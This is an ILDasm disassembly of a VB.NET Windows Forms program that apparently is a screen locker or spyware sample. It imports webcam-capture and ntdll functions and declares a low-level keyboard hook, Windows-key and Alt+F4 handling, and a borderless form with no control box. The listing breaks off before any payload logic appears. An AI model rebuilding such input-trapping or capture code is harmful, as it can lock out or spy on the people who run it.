
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.6.1055.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern user32.dll
.module extern user32
.module extern kernel32.dll
.module extern kernel32
.module extern wintrust.dll
.module extern avicap32.dll
.module extern KERNEL32.DLL
.module extern winmm.dll
.module extern gdi32.dll
.module extern gdi32
.module extern ntdll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly Application
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 31 46 38 42 32 32 37 31 2D 37 33 30 33   // ..$1F8B2271-7303
                                                                                                  2D 34 46 32 46 2D 38 42 34 42 2D 35 35 36 41 35   // -4F2F-8B4B-556A5
                                                                                                  46 43 42 33 43 38 36 00 00 )                      // FCB3C86..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module Application.exe
// MVID: {E4FDAF48-E562-4B53-BFB0-37A0E2D360FB}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x00470000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  ldtoken    My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       20 (0x14)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_0010

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0012

      IL_0010:  ldarg.0
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  initobj    !!T
      IL_0007:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  8
      IL_0000:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class private auto ansi Resources
       extends [mscorlib]System.Object
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 33 53 79 73 74 65 6D 2E 52 65 73 6F 75 72   // ..3System.Resour
                                                                                                  63 65 73 2E 54 6F 6F 6C 73 2E 53 74 72 6F 6E 67   // ces.Tools.Strong
                                                                                                  6C 79 54 79 70 65 64 52 65 73 6F 75 72 63 65 42   // lyTypedResourceB
                                                                                                  75 69 6C 64 65 72 08 31 35 2E 30 2E 30 2E 30 00   // uilder.15.0.0.0.
                                                                                                  00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private static class [mscorlib]System.Resources.ResourceManager resourceMan
  .field private static class [mscorlib]System.Globalization.CultureInfo resourceCulture
  .method assembly specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Resources::.ctor

  .method assembly specialname static class [mscorlib]System.Resources.ResourceManager 
          get_ResourceManager() cil managed
  {
    // Code size       49 (0x31)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Resources.ResourceManager Resources::resourceMan
    IL_0005:  ldnull
    IL_0006:  call       bool [mscorlib]System.Object::ReferenceEquals(object,
                                                                       object)
    IL_000b:  brfalse.s  IL_002b

    IL_000d:  ldstr      "Resources"
    IL_0012:  ldtoken    Resources
    IL_0017:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_001c:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Type::get_Assembly()
    IL_0021:  newobj     instance void [mscorlib]System.Resources.ResourceManager::.ctor(string,
                                                                                         class [mscorlib]System.Reflection.Assembly)
    IL_0026:  stsfld     class [mscorlib]System.Resources.ResourceManager Resources::resourceMan
    IL_002b:  ldsfld     class [mscorlib]System.Resources.ResourceManager Resources::resourceMan
    IL_0030:  ret
  } // end of method Resources::get_ResourceManager

  .method assembly specialname static class [mscorlib]System.Globalization.CultureInfo 
          get_Culture() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Globalization.CultureInfo Resources::resourceCulture
    IL_0005:  ret
  } // end of method Resources::get_Culture

  .method assembly specialname static void 
          set_Culture(class [mscorlib]System.Globalization.CultureInfo Value) cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  stsfld     class [mscorlib]System.Globalization.CultureInfo Resources::resourceCulture
    IL_0006:  ret
  } // end of method Resources::set_Culture

  .property class [mscorlib]System.Resources.ResourceManager
          ResourceManager()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Resources.ResourceManager Resources::get_ResourceManager()
  } // end of property Resources::ResourceManager
  .property class [mscorlib]System.Globalization.CultureInfo
          Culture()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Globalization.CultureInfo Resources::get_Culture()
    .set void Resources::set_Culture(class [mscorlib]System.Globalization.CultureInfo)
  } // end of property Resources::Culture
} // end of class Resources

.class public auto ansi Form1
       extends [System.Windows.Forms]System.Windows.Forms.Form
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.DesignerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested private SW
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype Form1/SW Hide = int32(0x00000000)
    .field public static literal valuetype Form1/SW Normal = int32(0x00000001)
    .field public static literal valuetype Form1/SW ShowMinimized = int32(0x00000002)
    .field public static literal valuetype Form1/SW ShowMaximized = int32(0x00000003)
    .field public static literal valuetype Form1/SW ShowNoActivate = int32(0x00000004)
    .field public static literal valuetype Form1/SW Show = int32(0x00000005)
    .field public static literal valuetype Form1/SW Minimize = int32(0x00000006)
    .field public static literal valuetype Form1/SW ShowMinNoActive = int32(0x00000007)
    .field public static literal valuetype Form1/SW ShowNA = int32(0x00000008)
    .field public static literal valuetype Form1/SW Restore = int32(0x00000009)
    .field public static literal valuetype Form1/SW ShowDefault = int32(0x0000000A)
    .field public static literal valuetype Form1/SW ForceMinimize = int32(0x0000000B)
    .field public static literal valuetype Form1/SW Max = int32(0x0000000B)
  } // end of class SW

  .class auto ansi sealed nested public LowLevelKeyboardProc
         extends [mscorlib]System.MulticastDelegate
  {
    .method public specialname rtspecialname 
            instance void  .ctor(object TargetObject,
                                 native int TargetMethod) runtime managed
    {
    } // end of method LowLevelKeyboardProc::.ctor

    .method public newslot strict virtual 
            instance class [mscorlib]System.IAsyncResult 
            BeginInvoke(int32 nCode,
                        native int wParam,
                        native int lParam,
                        class [mscorlib]System.AsyncCallback DelegateCallback,
                        object DelegateAsyncState) runtime managed
    {
    } // end of method LowLevelKeyboardProc::BeginInvoke

    .method public newslot strict virtual 
            instance native int  EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
    {
    } // end of method LowLevelKeyboardProc::EndInvoke

    .method public newslot strict virtual 
            instance native int  Invoke(int32 nCode,
                                        native int wParam,
                                        native int lParam) runtime managed
    {
    } // end of method LowLevelKeyboardProc::Invoke

  } // end of class LowLevelKeyboardProc

  .field private class [System]System.ComponentModel.IContainer components
  .field private bool keyPressAltF4
  .field private static literal int64 KEYEVENTF_EXTENDEDKEY = int64(0x1)
  .field private static literal int64 KEYEVENTF_KEYUP = int64(0x2)
  .field private static literal uint8 VK_LWIN = uint8(0x5B)
  .field private static literal int32 WH_KEYBOARD_LL = int32(0x0000000D)
  .field public static literal int32 WM_KEYUP = int32(0x00000101)
  .field private static class Form1/LowLevelKeyboardProc _proc
  .field private static native int _hookID
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       38 (0x26)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.0
    IL_0008:  ldftn      instance void Form1::Form1_Load(object,
                                                         class [mscorlib]System.EventArgs)
    IL_000e:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_0013:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::add_Load(class [mscorlib]System.EventHandler)
    IL_0018:  ldarg.0
    IL_0019:  ldc.i4.0
    IL_001a:  stfld      bool Form1::keyPressAltF4
    IL_001f:  ldarg.0
    IL_0020:  call       instance void Form1::InitializeComponent()
    IL_0025:  ret
  } // end of method Form1::.ctor

  .method family hidebysig strict virtual 
          instance void  Dispose(bool disposing) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       33 (0x21)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse.s  IL_0016

      IL_0003:  ldarg.0
      IL_0004:  ldfld      class [System]System.ComponentModel.IContainer Form1::components
      IL_0009:  brfalse.s  IL_0016

      IL_000b:  ldarg.0
      IL_000c:  ldfld      class [System]System.ComponentModel.IContainer Form1::components
      IL_0011:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0016:  leave.s    IL_0020

    }  // end .try
    finally
    {
      IL_0018:  ldarg.0
      IL_0019:  ldarg.1
      IL_001a:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Dispose(bool)
      IL_001f:  endfinally
    }  // end handler
    IL_0020:  ret
  } // end of method Form1::Dispose

  .method private instance void  InitializeComponent() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       164 (0xa4)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [System]System.ComponentModel.Container::.ctor()
    IL_0006:  stfld      class [System]System.ComponentModel.IContainer Form1::components
    IL_000b:  ldarg.0
    IL_000c:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::SuspendLayout()
    IL_0011:  ldarg.0
    IL_0012:  ldc.r4     6.
    IL_0017:  ldc.r4     13.
    IL_001c:  newobj     instance void [System.Drawing]System.Drawing.SizeF::.ctor(float32,
                                                                                   float32)
    IL_0021:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleDimensions(valuetype [System.Drawing]System.Drawing.SizeF)
    IL_0026:  ldarg.0
    IL_0027:  ldc.i4.1
    IL_0028:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoScaleMode)
    IL_002d:  ldarg.0
    IL_002e:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Aqua()
    IL_0033:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_BackColor(valuetype [System.Drawing]System.Drawing.Color)
    IL_0038:  ldarg.0
    IL_0039:  ldc.i4     0x24f
    IL_003e:  ldc.i4     0x15b
    IL_0043:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_0048:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ClientSize(valuetype [System.Drawing]System.Drawing.Size)
    IL_004d:  ldarg.0
    IL_004e:  ldc.i4.0
    IL_004f:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ControlBox(bool)
    IL_0054:  ldarg.0
    IL_0055:  ldc.i4.0
    IL_0056:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_FormBorderStyle(valuetype [System.Windows.Forms]System.Windows.Forms.FormBorderStyle)
    IL_005b:  ldarg.0
    IL_005c:  ldc.i4.1
    IL_005d:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_KeyPreview(bool)
